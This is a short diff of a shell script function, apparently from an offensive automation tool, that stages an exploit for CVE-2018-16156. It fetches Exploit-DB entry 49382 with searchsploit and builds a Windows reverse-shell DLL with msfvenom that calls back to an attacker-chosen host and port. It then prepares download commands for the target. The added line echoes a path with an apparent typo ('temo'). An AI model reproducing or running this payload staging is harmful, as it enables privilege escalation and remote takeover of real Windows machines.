@@ -569,6 +569,7 @@ perform_cve_2018_16156() {
         searchsploit -m 49382
     fi
     msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=$host_ip LPORT=$host_port
+    echo 'cd c:\windows\temo;'
     generate_windows_download "$cve_dir/49382.ps1" "49382.ps1"
     generate_windows_download "$cve_dir/UninOldIS.dll" "UninOldIS.dll"
     popd || return 1
